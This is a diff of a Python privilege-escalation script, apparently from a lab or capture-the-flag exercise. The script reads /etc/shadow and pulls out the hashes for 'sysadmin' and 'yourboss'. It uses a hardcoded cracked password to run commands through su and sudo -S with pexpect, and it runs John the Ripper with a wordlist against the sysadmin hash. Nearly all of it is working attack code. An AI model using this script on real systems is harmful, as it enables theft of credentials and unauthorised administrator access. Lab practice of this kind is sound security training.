@@ -6,6 +6,7 @@ import crypt
 import io
 import pexpect
 import subprocess
+import time
 
 
 def crack_password(pwd_entry):
@@ -27,14 +28,16 @@ def crack_password(pwd_entry):
 def exec_cmd_as_user(user, password, command):
 	""" Executes the given command as user elevated using sudo. """
 	spawned = pexpect.spawn('su %s -c "echo %s | sudo -S %s"' % (user, password, command))
-	ret_status = spawned.expect([pexpect.TIMEOUT, 'assword:']) # Catch both 'password:' and 'Password:'
+	ret_status = spawned.expect([pexpect.TIMEOUT, 'assword:'], timeout=60*30) # Catch both 'password:' and 'Password:', timeout at 30min (overkill)
 
 	if ret_status == 0:
 		return "Error: Process timed out"
 
 	else:
-		spawned.sendline(password)
-		return spawned.read().decode('utf-8')
+                print('here')
+                spawned.sendline(password)
+                time.sleep(60*2)
+                return spawned.read().decode('utf-8')
 
 
 # We already know tempuser's password
@@ -43,7 +46,6 @@ temp_password = "correctbatteryhorsestaple99"
 # Parse the shadow password file
 with io.open('/etc/shadow', 'r', encoding='utf8') as shadow:
 	for line in shadow.read().split('\n'):
-		print(line)
 		if line[0:8] == 'sysadmin':
 			sysadmin_hash = line
 		if line[0:8] == 'yourboss':
@@ -53,12 +55,10 @@ with io.open('/etc/shadow', 'r', encoding='utf8') as shadow:
 yourboss_cracked = 'money'#crack_password(yourboss_hash) # should be 'money'
 print(yourboss_cracked)
 
-print(sysadmin_hash)
-
 # Crack the admin's password using john
 #spawned = pexpect.spawn('su yourboss -c "whoami"')
 # Clean up sysadmin_hash
-sysadmin_hash = sysadmin_hash[sysadmin_hash.find('$'):sysadmin_hash.replace(':', '', 1).find(':')]
+#sysadmin_hash = sysadmin_hash[sysadmin_hash.find('$'):sysadmin_hash.replace(':', '', 1).find(':')]
 
 # s = 'echo "' + sysadmin_hash + '" > /home/yourboss/temp_hash.txt'
 # print(s)
@@ -66,9 +66,12 @@ sysadmin_hash = sysadmin_hash[sysadmin_hash.find('$'):sysadmin_hash.replace(':',
 
 
 
-print(exec_cmd_as_user('yourboss', yourboss_cracked, 'cat /home/yourboss/temp_hash.txt'))
+#print(exec_cmd_as_user('yourboss', yourboss_cracked, 'cat /home/yourboss/temp_hash.txt'))
 
-print(exec_cmd_as_user('yourboss', yourboss_cracked, 'john --wordlist=/usr/share/dict/american-english-small /home/yourboss/temp_hash.txt'))
+with open('temp_hash.txt', 'w') as temp_hash:
+    temp_hash.write(sysadmin_hash)
+
+print(exec_cmd_as_user('yourboss', yourboss_cracked, 'john --wordlist=/usr/share/dict/american-english-small temp_hash.txt'))
 
 '''
 spawned = pexpect.spawn('su yourboss -c "echo %s | sudo -S "')
